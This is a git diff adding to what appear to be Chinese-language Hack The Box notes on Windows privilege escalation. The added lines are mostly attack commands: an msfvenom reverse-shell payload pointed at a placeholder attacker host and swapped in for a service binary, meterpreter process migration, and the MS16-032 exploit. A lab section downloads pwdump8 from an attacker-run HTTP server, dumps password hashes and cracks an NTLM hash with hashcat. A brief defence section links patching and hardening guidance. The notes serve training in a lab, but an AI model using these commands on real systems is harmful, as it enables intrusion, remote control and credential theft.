@@ -359,9 +359,47 @@ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 EOL系统
 C:\htb> wmic qfe        查看当前补丁
 
+Win8
 使用 Sherlock 枚举缺失的补丁        https://github.com/rasta-mouse/Sherlock
 C:\htb> Set-ExecutionPolicy bypass -Scope process
 C:\htb> Import-Module .\Sherlock.ps1
 C:\htb> Find-AllVulns
 
+meterpreter > migrate 2796                迁移到2796号进程
+
+C:\Tools>SharpUp.exe audit
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f exe > SecurityService.exe
+C:\Tools>cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+C:\>sc start SecurityService
+
+Win7
+wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
+python2 windows-exploit-suggester.py --update                更新脚本
+wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
+tar -xf setuptools-2.0.tar.gz && cd setuptools-2.0/ && sudo python2 setup.py install                安装依赖1
+cd ~
+wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
+tar -xf xlrd-1.0.0.tar.gz && cd xlrd-1.0.0/ && sudo python2 setup.py install && cd ~                安装依赖2
+python2 windows-exploit-suggester.py --database 20XX-XX-XX-mssb.xls --systeminfo systemInfo.txt        运行脚本
+C:\Tools>Import-Module .\Invoke-MS16-032.ps1
+C:\Tools>Invoke-MS16-032
+
+***
+防御
+https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus
+使用组策略管理控制台 (Group Policy Management Console, GPMC) 或通过 Powershell 来实现组策略
+
+https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/security-compliance-toolkit-10
+https://www.cyber.mil/stigs/
+
+***
+Lab
+
+wget https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
+unzip pwdump8-8.2.zip
+cd pwdump8/
+python3 -m http.server PWNPO
+curl http://PWNIP:PWNPO/pwdump8.exe -o "C:\Users\htb-student\Desktop\pwdump8.exe"
+C:\Users\htb-student\desktop\pwdump8.exe
+hashcat -m 1000 5835048CE94AD0564E29A924A03510EF /usr/share/wordlists/rockyou.txt
 
